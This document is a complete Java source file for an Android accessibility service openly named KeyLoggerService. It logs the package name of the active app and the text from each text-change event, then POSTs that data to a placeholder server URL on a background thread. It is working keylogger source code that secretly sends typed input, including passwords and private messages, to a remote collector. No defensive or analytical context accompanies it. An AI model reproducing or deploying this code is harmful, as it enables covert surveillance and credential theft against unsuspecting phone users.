package com.example.keylogger;

import android.accessibilityservice.AccessibilityService;
import android.util.Log; 
import android.view.accessibility.AccessibilityEvent;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class KeyLoggerService extends AccessibilityService {
    
    private static final String SERVER_URL = "YOUR_SERVER_URL";
    
    private String currentAppPackage = "unknown";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (event.getPackageName() != null && !event.getPackageName().toString().isEmpty()) {
                this.currentAppPackage = event.getPackageName().toString();
                // Log.d("KeyLoggerService", "Current App: " + this.currentAppPackage); // डीबगिंग के लिए
            }
        }

        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText().toString();
            
            if (text != null && text.length() > 2) { 
                text = text.substring(1, text.length() - 1); 
            }

            String logData = this.currentAppPackage + " : " + text;
            

            sendToServer(logData);
        }
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    private void sendToServer(String text) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "text/plain; charset=utf-8"); 

                OutputStream os = conn.getOutputStream();
                os.write(text.getBytes("UTF-8")); 
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode(); // Send request
                // Log.d("KeyLoggerService", "Server Response: " + responseCode);

            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}
